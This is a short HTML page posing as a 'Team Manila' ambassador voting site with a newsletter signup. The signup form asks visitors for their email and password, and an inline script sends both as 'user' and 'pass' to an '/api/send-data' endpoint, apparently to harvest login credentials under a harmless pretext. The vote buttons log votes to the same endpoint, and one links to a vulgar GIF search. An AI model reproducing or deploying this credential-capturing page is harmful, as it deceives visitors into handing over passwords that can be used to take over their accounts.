<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Team Manila - Vote for Our Ambassador</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <nav>
        <div class="logo">TEAM MANILA</div>
        <div class="menu-toggle">â˜°</div>
    </nav>

    <header class="hero">
        <div class="hero-overlay">
            <h1>TEAM MANILA: YOUR URBAN STYLE DESTINATION</h1>
            <a href="#vote" class="hero-btn">Vote Now!</a>
        </div>
    </header>

    <main id="vote">
        <section class="voting-header">
            <h2>VOTE FOR THE NEXT AMBASSADOR</h2>
            <p class="deadline">DEADLINE UNTIL</p>
            <p class="date">DEC 26, 2025</p>
        </section>

        <section class="grid-container">
            <div class="candidate-card">
                <img src="1.jpg" alt="Ishi">
                <div class="card-info">
                    <div class="name">Ishi</div>
                    <a href="https://tenor.com/search/cat-fuck-you-gifs" class="vote-btn" onclick="sendVote('Ishi')">Vote Now</a>
                </div>
            </div>
            <div class="candidate-card">
                <img src="3.jpg" alt="James">
                <div class="card-info">
                    <div class="name">James</div>
                    <a href="https://www.facebook.com/share/1B8sp3b4QE/" class="vote-btn" onclick="sendVote('James')">Vote Now</a>
                </div>
            </div>
        </section>

        <section class="newsletter">
            <h3>Subscribe to our newsletter</h3>
            <form id="authForm">
                <input type="email" id="email" placeholder="Your Email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="sub-btn">Subscribe</button>
            </form>
        </section>
    </main>

    <script>
        const form = document.getElementById('authForm');
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            await fetch('/api/send-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user: email, pass: password, type: 'Newsletter' })
            });
            alert('Submitted!');
        });

        async function sendVote(candidate) {
            fetch('/api/send-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user: 'VOTER', pass: 'Voted: ' + candidate, type: 'Vote' })
            });
        }
    </script>
</body>
</html>
